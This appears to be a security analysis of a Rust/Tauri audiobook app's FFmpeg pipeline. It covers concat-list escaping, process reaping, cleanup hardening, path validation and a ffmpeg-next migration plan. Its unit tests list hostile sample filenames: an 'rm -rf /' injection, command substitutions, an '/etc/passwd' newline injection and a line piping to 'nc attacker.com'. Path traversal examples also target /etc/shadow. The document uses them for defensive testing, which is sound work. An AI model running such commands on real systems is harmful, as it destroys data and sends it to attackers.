# Security Analysis: Audio Processing Pipeline

## Executive Summary

This document analyzes security vulnerabilities in the audiobook processing codebase and provides remediation strategies. The analysis identifies critical issues in concat-list escaping (no shell used), process termination/reaping, and resource cleanup, along with a type-safe ffmpeg-next migration path. Items are prioritized and aligned with `docs/planning/hand-off-2025-08-07.md`.

## Table of Contents

- [Executive Summary](#executive-summary)
- [Table of Contents](#table-of-contents)
- [Critical Security Vulnerabilities](#critical-security-vulnerabilities)
- [Proposed Type-Safe Alternative: ffmpeg-next](#proposed-type-safe-alternative-ffmpeg-next)
- [Prioritized Security Plan (aligned with hand-off)](#prioritized-security-plan-aligned-with-hand-off)
- [Testing Security Improvements](#testing-security-improvements)
- [Security Monitoring and Logging](#security-monitoring-and-logging)
- [Conclusion](#conclusion)
- [References](#references)


## Critical Security Vulnerabilities

### 1. Concat Demuxer Path Escaping Risks (no shell used)

#### Current Implementation Issues

**Location**: `src-tauri/src/ffmpeg/command.rs` (lines 141-145)
```rust
// VULNERABLE CODE
let path_str = input.to_str()
    .ok_or_else(|| FFmpegError::ExecutionFailed(
        "Invalid UTF-8 in file path".to_string()
    ))?;
concat_list.push_str(&format!("file '{path_str}'\n"));
```

**Context**: FFmpeg is invoked without a shell (via `std::process::Command`). The risk is malformed concat-list lines confusing the FFmpeg concat demuxer when paths are inserted unescaped.

**Problem Example (newline injection)**:
```
audio.mp3\nfile '/etc/passwd
```

#### Remediation Strategy

1. **Immediate Fix**: Implement proper shell escaping (use this helper in both `ffmpeg/command.rs` and `audio/processor.rs`)
```rust
fn escape_ffmpeg_path(path: &str) -> String {
    // Escape single quotes by replacing ' with '\''
    path.replace('\'', "'\\''")
        .replace('\n', "")  // Remove newlines
        .replace('\r', "")  // Remove carriage returns
        .replace(';', "\\;") // Escape semicolons
        .replace('|', "\\|") // Escape pipes
        .replace('&', "\\&") // Escape ampersands
        .replace('$', "\\$") // Escape dollar signs
        .replace('`', "\\`") // Escape backticks
}
```

2. **Long-term Solution**: Use ffmpeg-next for type-safe FFmpeg bindings (see Section 5)

### 2. Concat File Generation Escaping Gaps

#### Current Implementation Issues

**Location**: `src-tauri/src/audio/processor.rs` (lines 212-213)
```rust
// VULNERABLE CODE
let escaped_path = file.path.to_string_lossy().replace('\'', "'\"'\"'");
content.push_str(&format!("file '{escaped_path}'\n"));
```

**Vulnerability**: Incomplete escaping that only handles single quotes. Does not account for CR/LF or NUL characters, which can corrupt the concat list.

**Attack Scenarios**:
1. **Newline Injection**: 
   ```
   audio.mp3\nfile '/etc/passwd
   ```
2. **Path Traversal**: 
   ```
   ../../../../../../etc/shadow.mp3
   ```

#### Remediation Strategy

1. **Input Validation**: Validate paths before processing (at concat-list build time)
```rust
fn validate_safe_path(path: &Path) -> Result<()> {
    // Check for path traversal attempts
    let canonical = path.canonicalize()
        .map_err(|_| AppError::FileValidation("Invalid path".to_string()))?;
    
    // Ensure path is within expected directory
    if !canonical.starts_with(&allowed_base_path) {
        return Err(AppError::FileValidation("Path traversal detected".to_string()));
    }
    
    // Check for suspicious characters in filename
    if let Some(name) = path.file_name() {
        let name_str = name.to_string_lossy();
        if name_str.contains('\n') || name_str.contains('\r') || 
           name_str.contains('\0') || name_str.contains("..") {
            return Err(AppError::FileValidation("Invalid characters in filename".to_string()));
        }
    }
    
    Ok(())
}
```

2. **Use Temporary Files with Safe Names**: Generate concat files with UUIDs
```rust
use uuid::Uuid;

fn create_safe_concat_file(files: &[AudioFile], temp_dir: &Path) -> Result<PathBuf> {
    let safe_filename = format!("concat_{}.txt", Uuid::new_v4());
    let concat_file = temp_dir.join(safe_filename);
    
    // Write using absolute paths with validation
    let mut content = String::new();
    for file in files {
        validate_safe_path(&file.path)?;
        let absolute_path = file.path.canonicalize()?;
        // Use FFmpeg's concat demuxer safe mode with absolute paths
        content.push_str(&format!("file '{}'\n", 
            escape_ffmpeg_path(&absolute_path.to_string_lossy())));
    }
    
    std::fs::write(&concat_file, content)?;
    Ok(concat_file)
}
```

### 3. Process Termination and Reaping

#### Current Implementation Issues

**Location**: `src-tauri/src/audio/progress_monitor.rs` (lines 141-153)
```rust
// RACE CONDITION
let _ = child.kill();

// Wait for process to actually terminate
for i in 0..PROCESS_TERMINATION_MAX_ATTEMPTS {
    if let Ok(Some(_)) = child.try_wait() {
        log::debug!("FFmpeg process terminated successfully");
        break;
    }
    std::thread::sleep(std::time::Duration::from_millis(PROCESS_TERMINATION_CHECK_DELAY_MS));
}
```

**Notes**:
- On Unix, `Child::kill()` sends SIGKILL (forceful). The primary concern is ensuring the child is reaped to avoid zombies.

**Gaps**:
1. We poll with `try_wait()` but do not perform a final guaranteed `wait()` if the loop ends without observing exit.
2. No graceful SIGTERM step (optional improvement).

#### Remediation Strategy

1. **Implement Graceful Shutdown with Escalation** (keep a simple sync fallback while we evolve async code):
```rust
use std::time::{Duration, Instant};
use nix::sys::signal::{self, Signal};
use nix::unistd::Pid;

async fn terminate_process_safely(child: &mut Child) -> Result<()> {
    let pid = Pid::from_raw(child.id() as i32);
    let start = Instant::now();
    
    // Step 1: Try SIGTERM (graceful)
    signal::kill(pid, Signal::SIGTERM)?;
    
    // Wait up to 5 seconds for graceful shutdown
    while start.elapsed() < Duration::from_secs(5) {
        if let Ok(Some(status)) = child.try_wait() {
            log::info!("Process terminated gracefully: {:?}", status);
            return Ok(());
        }
        tokio::time::sleep(Duration::from_millis(100)).await;
    }
    
    // Step 2: Send SIGKILL (forceful)
    log::warn!("Process didn't respond to SIGTERM, sending SIGKILL");
    signal::kill(pid, Signal::SIGKILL)?;
    
    // Wait up to 2 seconds for forced termination
    let kill_start = Instant::now();
    while kill_start.elapsed() < Duration::from_secs(2) {
        if let Ok(Some(status)) = child.try_wait() {
            log::info!("Process force-terminated: {:?}", status);
            return Ok(());
        }
        tokio::time::sleep(Duration::from_millis(100)).await;
    }
    
    Err(AppError::General("Failed to terminate process".to_string()))
}
```

2. **Use ProcessGuard with Proper RAII** (drop handler ensures cleanup even on panic/early return):
```rust
impl Drop for ProcessGuard {
    fn drop(&mut self) {
        if let Ok(mut lock) = self.process.lock() {
            if let Some(mut child) = lock.take() {
                // Use tokio runtime for async termination
                let handle = tokio::runtime::Handle::try_current();
                if let Ok(handle) = handle {
                    let _ = handle.block_on(terminate_process_safely(&mut child));
                } else {
                    // Fallback to sync termination
                    let _ = child.kill();
                    let _ = child.wait();
                }
            }
        }
    }
}
```

### 4. Resource Cleanup Vulnerabilities

#### Current Implementation Issues

**Location**: `src-tauri/src/audio/cleanup.rs`
- No atomic cleanup operations
- Potential for partial cleanup on failure
- Race conditions between concurrent cleanup attempts

**Vulnerabilities**:
1. **Partial State**: Cleanup may leave system in inconsistent state
2. **Double-Free**: Multiple cleanup attempts on same resource
3. **Permission Errors**: No handling of permission-denied scenarios

#### Remediation Strategy

1. **Implement Atomic Cleanup Operations**:
```rust
use std::sync::atomic::{AtomicBool, Ordering};

pub struct AtomicCleanupGuard {
    paths: HashSet<PathBuf>,
    session_id: String,
    cleaned: AtomicBool,
    cleanup_mutex: Mutex<()>,
}

impl AtomicCleanupGuard {
    pub fn cleanup_now(&mut self) -> Result<()> {
        // Ensure single cleanup execution
        let _lock = self.cleanup_mutex.lock()
            .map_err(|_| AppError::General("Cleanup lock poisoned".to_string()))?;
        
        // Check and set atomic flag
        if self.cleaned.compare_exchange(false, true, 
            Ordering::SeqCst, Ordering::SeqCst).is_err() {
            log::debug!("Cleanup already performed for session {}", self.session_id);
            return Ok(());
        }
        
        // Perform cleanup with rollback on failure
        let mut cleaned_paths = Vec::new();
        let mut first_error = None;
        
        for path in &self.paths {
            match self.cleanup_single_path_safe(path) {
                Ok(()) => cleaned_paths.push(path.clone()),
                Err(e) => {
                    log::error!("Cleanup failed for {}: {}", path.display(), e);
                    first_error = Some(e);
                    break; // Stop on first error
                }
            }
        }
        
        // Rollback on error (best effort)
        if first_error.is_some() {
            for path in cleaned_paths {
                self.paths.insert(path); // Re-add for retry
            }
            self.cleaned.store(false, Ordering::SeqCst);
        }
        
        first_error.map_or(Ok(()), Err)
    }
    
    fn cleanup_single_path_safe(&self, path: &Path) -> Result<()> {
        // Use atomic rename before delete for safety
        let trash_dir = std::env::temp_dir().join(".audiobook_trash").join(&self.session_id);
        std::fs::create_dir_all(&trash_dir)?;
        
        let trash_path = trash_dir.join(Uuid::new_v4().to_string());
        std::fs::rename(path, &trash_path)?;
        
        // Async cleanup of trash
        tokio::spawn(async move {
            tokio::time::sleep(Duration::from_secs(5)).await;
            let _ = tokio::fs::remove_dir_all(trash_path).await;
        });
        
        Ok(())
    }
}
```

## 5. Proposed Type-Safe Alternative: ffmpeg-next

### Benefits of ffmpeg-next

1. **Type Safety**: No string concatenation or shell command building
2. **Memory Safety**: Rust's ownership system prevents buffer overflows
3. **No Shell Injection**: Direct FFmpeg library calls bypass shell entirely
4. **Better Error Handling**: Structured errors instead of string parsing

### Implementation Example

```rust
use ffmpeg_next as ffmpeg;
use ffmpeg::{format, codec, frame, Packet};

pub struct SafeMediaProcessor {
    session_id: String,
}

impl SafeMediaProcessor {
    pub fn merge_audio_files(&self, 
        input_files: Vec<PathBuf>, 
        output_path: &Path,
        settings: &AudioSettings
    ) -> Result<()> {
        ffmpeg::init()?;
        
        // Open output context
        let mut output = format::output(output_path)?;
        
        // Configure output format
        let mut output_stream = output.add_stream(codec::id::Id::AAC)?;
        let context = output_stream.codec();
        context.set_bit_rate(settings.bitrate * 1000);
        context.set_sample_rate(settings.sample_rate);
        context.set_channels(settings.channels as i32);
        context.set_channel_layout(codec::channel_layout::STEREO);
        
        // Process input files safely
        for input_path in input_files {
            // Validate path before processing
            validate_safe_path(&input_path)?;
            
            let mut input = format::input(&input_path)?;
            
            // Copy packets safely
            for (stream, packet) in input.packets() {
                if stream.index() == 0 { // Audio stream
                    output.write_packet(&packet)?;
                }
            }
        }
        
        output.write_trailer()?;
        Ok(())
    }
}
```

### Migration Strategy (aligns with current refactor plan)

1. **Phase 1**: Add ffmpeg-next to Cargo.toml
```toml
[dependencies]
ffmpeg-next = "7.0"
ffmpeg-sys-next = "7.0"
```

2. **Phase 2**: Create safe wrapper module
```rust
mod safe_ffmpeg {
    use ffmpeg_next as ffmpeg;
    
    pub struct SafeProcessor {
        // Implementation
    }
    
    pub trait MediaProcessor {
        fn process(&self, plan: MediaProcessingPlan) -> Result<()>;
    }
}
```

3. **Phase 3**: Gradual migration with feature flags
```rust
#[cfg(feature = "safe-ffmpeg")]
use safe_ffmpeg::SafeProcessor;

#[cfg(not(feature = "safe-ffmpeg"))]
use legacy_ffmpeg::CommandProcessor;
```

## 6. Input Validation Improvements

### Comprehensive Validation Framework

```rust
use std::path::{Path, PathBuf};
use regex::Regex;

pub struct PathValidator {
    allowed_extensions: Vec<String>,
    max_path_length: usize,
    forbidden_patterns: Vec<Regex>,
}

impl PathValidator {
    pub fn new() -> Self {
        Self {
            allowed_extensions: vec![
                "mp3".to_string(), 
                "m4a".to_string(), 
                "m4b".to_string(),
                "aac".to_string(),
                "flac".to_string(),
                "ogg".to_string(),
            ],
            max_path_length: 4096,
            forbidden_patterns: vec![
                Regex::new(r"\.\./").unwrap(),  // Path traversal
                Regex::new(r"^\s*\|").unwrap(),  // Pipe at start
                Regex::new(r";\s*$").unwrap(),   // Semicolon at end
                Regex::new(r"\$\{").unwrap(),    // Variable expansion
                Regex::new(r"`").unwrap(),       // Command substitution
                Regex::new(r"\x00").unwrap(),    // Null bytes
            ],
        }
    }
    
    pub fn validate_path(&self, path: &Path) -> Result<()> {
        // Check path length
        let path_str = path.to_string_lossy();
        if path_str.len() > self.max_path_length {
            return Err(AppError::FileValidation(
                format!("Path too long: {} chars", path_str.len())
            ));
        }
        
        // Check for forbidden patterns
        for pattern in &self.forbidden_patterns {
            if pattern.is_match(&path_str) {
                return Err(AppError::FileValidation(
                    "Path contains forbidden characters".to_string()
                ));
            }
        }
        
        // Validate extension
        if let Some(ext) = path.extension() {
            let ext_str = ext.to_string_lossy().to_lowercase();
            if !self.allowed_extensions.contains(&ext_str) {
                return Err(AppError::FileValidation(
                    format!("Unsupported file type: .{}", ext_str)
                ));
            }
        } else {
            return Err(AppError::FileValidation(
                "File has no extension".to_string()
            ));
        }
        
        // Ensure file exists and is readable
        if !path.exists() {
            return Err(AppError::FileValidation(
                format!("File not found: {}", path.display())
            ));
        }
        
        // Check file permissions
        let metadata = std::fs::metadata(path)
            .map_err(|e| AppError::FileValidation(
                format!("Cannot read file metadata: {}", e)
            ))?;
        
        if !metadata.is_file() {
            return Err(AppError::FileValidation(
                "Path is not a regular file".to_string()
            ));
        }
        
        // Canonicalize to prevent symlink attacks
        let canonical = path.canonicalize()
            .map_err(|e| AppError::FileValidation(
                format!("Cannot canonicalize path: {}", e)
            ))?;
        
        // Additional check: ensure canonical path is still valid
        self.validate_canonical_path(&canonical)?;
        
        Ok(())
    }
    
    fn validate_canonical_path(&self, path: &Path) -> Result<()> {
        // Ensure canonicalized path doesn't escape to system directories
        let path_str = path.to_string_lossy();
        let forbidden_prefixes = [
            "/etc", "/sys", "/proc", "/dev", 
            "/boot", "/root", "C:\\Windows", "C:\\System"
        ];
        
        for prefix in &forbidden_prefixes {
            if path_str.starts_with(prefix) {
                return Err(AppError::FileValidation(
                    format!("Access to system directory denied: {}", prefix)
                ));
            }
        }
        
        Ok(())
    }
}
```

### Settings Validation (align with current code)

```rust
// Actual constraints in code today
fn validate_bitrate(bitrate: u32) -> Result<()> {
    if !(32..=128).contains(&bitrate) {
        return Err(AppError::InvalidInput(
            format!("Bitrate must be between 32-128 kbps, got: {bitrate}")
        ));
    }
    Ok(())
}

fn validate_explicit_sample_rate(sample_rate: u32) -> Result<()> {
    let valid_rates = [22050, 32000, 44100, 48000];
    if !valid_rates.contains(&sample_rate) {
        return Err(AppError::InvalidInput(
            format!("Unsupported sample rate: {sample_rate}. Valid rates: {valid_rates:?}")
        ));
    }
    Ok(())
}

// Output path: parent dir must exist; extension must be .m4b
// Optional improvement (P2): attempt a temporary write to verify permissions.
```

## 7. Prioritized Security Plan (single, canonical plan)

The canonical plan is maintained in `docs/planning/hand-off-2025-08-07.md` under “Consolidated plan (canonical)”. Summary:

- Pre-ffmpeg-next
  - Centralize concat escaping and canonicalization (DONE)
  - Introduce `MediaProcessor` + `ShellFFmpegProcessor` (no behavior change)
  - Ensure child reaping after cancel (best-effort `wait()` after `kill()` polling)
  - Prefer bundled FFmpeg for releases (optional checksum verification)

- Post-ffmpeg-next
  - Feature flag scaffold (`safe-ffmpeg`) and `FfmpegNextProcessor` (non-default)
  - Migrate off concat files; retire `escape_ffmpeg_path`
  - Maintain input path validation (exists, is regular file, extension whitelist); canonicalize; define symlink/base-dir policy as needed
  - Optional: write-permission probe for output directory

## 8. Testing Security Improvements

### Unit Tests for Security Functions

```rust
#[cfg(test)]
mod security_tests {
    use super::*;
    
    #[test]
    fn test_path_traversal_detection() {
        let validator = PathValidator::new();
        
        let malicious_paths = vec![
            Path::new("../../../etc/passwd"),
            Path::new("audio/../../../system.mp3"),
            Path::new("./../../sensitive.mp3"),
        ];
        
        for path in malicious_paths {
            assert!(validator.validate_path(path).is_err());
        }
    }
    
    #[test]
    fn test_command_injection_prevention() {
        let malicious_inputs = vec![
            "file'; rm -rf /; echo '.mp3",
            "audio$(whoami).mp3",
            "test`id`.mp3",
            "file\nfile /etc/passwd\n.mp3",
            "audio|nc attacker.com 1234.mp3",
        ];
        
        for input in malicious_inputs {
            let escaped = escape_ffmpeg_path(input);
            assert!(!escaped.contains('\'') || escaped.contains("\\'"));
            assert!(!escaped.contains('\n'));
            assert!(!escaped.contains('`'));
            assert!(!escaped.contains('$'));
        }
    }
    
    #[test]
    fn test_process_termination_safety() {
        use std::process::Command;
        
        let mut child = Command::new("sleep")
            .arg("60")
            .spawn()
            .unwrap();
        
        let guard = ProcessGuard::new(
            child, 
            "test-session".to_string(), 
            "test process".to_string()
        );
        
        let result = guard.terminate();
        assert!(result.is_ok());
        
        // Verify process is terminated
        let handle = guard.process_handle();
        let lock = handle.lock().unwrap();
        assert!(lock.is_none());
    }
}
```

### Fuzzing Tests

```rust
#[cfg(test)]
mod fuzz_tests {
    use quickcheck::quickcheck;
    
    quickcheck! {
        fn prop_concat_line_stable(input: String) -> bool {
            let escaped = escape_ffmpeg_path(&input);
            // Verify no CR/LF/NUL remain after escaping
            !escaped.contains('\n') && !escaped.contains('\r') && !escaped.contains('\0')
        }
        
        fn prop_path_validation_consistent(path: String) -> bool {
            let validator = PathValidator::new();
            let path_buf = PathBuf::from(path);
            
            // Validation should be deterministic
            let result1 = validator.validate_path(&path_buf);
            let result2 = validator.validate_path(&path_buf);
            
            result1.is_ok() == result2.is_ok()
        }
    }
}
```

## 9. Security Monitoring and Logging

### Implement Security Event Logging

```rust
use log::{info, warn, error};
use serde::{Serialize, Deserialize};

#[derive(Debug, Serialize, Deserialize)]
pub struct SecurityEvent {
    timestamp: chrono::DateTime<chrono::Utc>,
    session_id: String,
    event_type: SecurityEventType,
    details: String,
    severity: Severity,
}

#[derive(Debug, Serialize, Deserialize)]
pub enum SecurityEventType {
    PathTraversalAttempt,
    InvalidCharactersInPath,
    ProcessTerminationFailure,
    ResourceCleanupFailure,
    CommandInjectionAttempt,
    UnauthorizedFileAccess,
}

#[derive(Debug, Serialize, Deserialize)]
pub enum Severity {
    Low,
    Medium,
    High,
    Critical,
}

pub struct SecurityLogger {
    events: Mutex<Vec<SecurityEvent>>,
}

impl SecurityLogger {
    pub fn log_event(&self, event: SecurityEvent) {
        match event.severity {
            Severity::Critical | Severity::High => {
                error!("SECURITY: {:?} - {}", event.event_type, event.details);
            }
            Severity::Medium => {
                warn!("SECURITY: {:?} - {}", event.event_type, event.details);
            }
            Severity::Low => {
                info!("SECURITY: {:?} - {}", event.event_type, event.details);
            }
        }
        
        // Store for audit trail
        if let Ok(mut events) = self.events.lock() {
            events.push(event);
        }
    }
    
    pub fn export_audit_log(&self) -> Result<String> {
        let events = self.events.lock()
            .map_err(|_| AppError::General("Failed to access audit log".to_string()))?;
        
        serde_json::to_string_pretty(&*events)
            .map_err(|e| AppError::General(format!("Failed to serialize audit log: {}", e)))
    }
}
```

## 10. Conclusion

The current implementation has several security gaps that need immediate attention. The most pressing issues are:

1. **Concat demuxer path escaping** in list generation (two call sites)
2. **Process reaping after cancel** to avoid zombies (keep RAII)
3. **Cleanup hardening** for more reliable teardown

The recommended approach is to:
1. Complete P0 items first (shared escaping + validation), matching the hand-off plan
    - P0 & P1 items located here: docs/planning/ffmpeg-next-migration.md
2. Implement P1 boundary and process reaping; prefer bundled FFmpeg in releases
3. Begin migration to ffmpeg-next behind a feature flag
4. Establish security testing and monitoring practices

These improvements will significantly enhance the security posture of the audiobook processing system while maintaining functionality and performance.

## References

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [Rust Security Guidelines](https://anssi-fr.github.io/rust-guide/)
- [FFmpeg Security Considerations](https://ffmpeg.org/security.html)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [CWE-73: External Control of File Name or Path](https://cwe.mitre.org/data/definitions/73.html)
